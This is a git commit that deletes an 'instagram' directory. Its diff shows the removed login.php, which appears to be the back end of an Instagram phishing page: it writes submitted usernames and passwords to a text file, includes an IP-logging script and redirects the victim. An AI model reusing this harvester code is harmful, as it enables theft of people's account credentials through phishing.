afcf9c4406702ead82bca8d396e08999c9bf24c9
Ranjith <54652554+mrravanan@users.noreply.github.com>
2021-08-10 10:18:48 +0530

    Delete instagram directory

--- instagram/login.php
+++
@@ -1,7 +0,0 @@
-<?php
-include 'ip.php';
-
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location:/index2.html');
-exit();
-
